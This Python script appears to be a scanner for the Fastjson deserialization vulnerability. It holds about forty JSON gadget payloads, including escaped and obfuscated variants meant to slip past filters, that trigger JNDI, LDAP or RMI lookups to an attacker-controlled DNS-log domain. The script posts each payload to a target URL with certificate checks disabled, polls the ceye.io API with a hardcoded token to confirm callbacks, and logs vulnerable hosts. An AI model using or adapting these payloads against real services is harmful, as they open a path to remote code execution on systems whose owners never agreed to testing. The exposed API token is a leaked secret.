import re
import requests
import time


proxies = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Content-Type": "application/json;charset=UTF-8",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    "Cookie": "loginPageURL="
}
headerss = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"} 
payload = {'1':'{"@type":"java.net.Inet4Address","val":"http://dnslog"}','2':'{"@type":"java.net.Inet6Address","val":"http://dnslog"}','3':'{{"@type":"java.net.URL","val":"http://dnslog"}:"aaa"}','5':'{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}','6':'Set[{"@type":"java.net.URL","val":"http://dnslog"}]','7':'Set[{"@type":"java.net.URL","val":"http://dnslog"}','8':'{"@type":"java.net.InetSocketAddress"{"address":,"val":"http://dnslog"}}','9':'{{"@type":"java.net.URL","val":"http://dnslog"}:0','10':'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog", "autoCommit":true}','11':'{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"rmi://dnslog", "loginTimeout":0','12':'{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://dnslog", "autoCommit":true}','13':'{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://dnslog", "autoCommit":true}','14':'{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://dnslog", "autoCommit":true}','15':'{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://dnslog"}}','16':'{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://dnslog","autoCommit":true}}','17':'{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://dnslog"}','18':'{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://dnslog"}','19':'{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://dnslog"}','20':'{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://dnslog"}','21':'{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://dnslog","Object":"a"}','22':'{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://dnslog"}','23':'{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://dnslog"}, "namespace":""}','24':'{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://dnslog"}','25':'{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://dnslog"], "Realms":[""]}','26':'{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://dnslog"}','27':'{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://dnslog"}','28':'{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://dnslog"}','29':'{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://dnslog"}}','30':'{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://dnslog"], "tm": {"$ref":"$.tm"}}','31':'{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://dnslog","instance":{"$ref":"$.instance"}}','32':'{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://dnslog"}','33':'{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://dnslog"}','34':'{"@type":"com.caucho.config.types.ResourceRef","lookupName": "ldap://dnslog", "value": {"$ref":"$.value"}}','35':'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}','36':'{  "@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}','37':'{/*s6*/"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}','38':'{\n"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}','39':'{"@type"\b:"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}','40':'{"\u0040\u0074\u0079\u0070\u0065":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}','41':'{"\x40\x74\x79\x70\x65":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}',}

def fastjson_check(url):
    for i in payload.keys():
        try:
            dnslog = 'chobits' + i
            dns = dnslog + '.hsl35u.ceye.io'
            data = re.sub(r'dnslog',dns,payload[i])
            requests.packages.urllib3.disable_warnings()
            sends = requests.post(url=url,headers=headers,data=data,timeout=20,verify=False)
        except:
            print (url+'访问失败，请到源码配置ceye.io的API或检查网络')
        
        time.sleep(3)
        try:
            check_dnslog = requests.get(url="http://api.ceye.io/v1/records?token=180a5ca69564997af21e4f109007f595&type=dns&filter=",headers=headerss)
            #http://api.ceye.io/v1/records?token={token}&type={dns|http}&filter={filter}，详细使用请阅http://ceye.io/api
        except:
            print ('API调用失败，重新执行')
        if check_dnslog.text.find(dnslog) >= 0:
            print ('[+]'+url+' is fastjson')
            print ('[+]payload: '+i+'&'+payload[i])
            with open('result.txt','a+') as f:
                f.write('[+]'+url+' is fastjson\n')
            
            #print (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
        else:
            print ('[-]'+url+' is not vul to fastjson&payload:'+i)
            with open('result.txt','a+') as f:
                f.write('[-]'+url+' is not vul to fastjson\n')
            
def start(url):
    with open('result.txt','a+') as f:
            f.write('------------------'+time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))+'------------------\n')

    print('dnslog接收可能会有延迟，为了提高准确性,检测一个需要等待30s左右。')
    print('------------------------------------开始检测------------------------------------')
    fastjson_check(url)
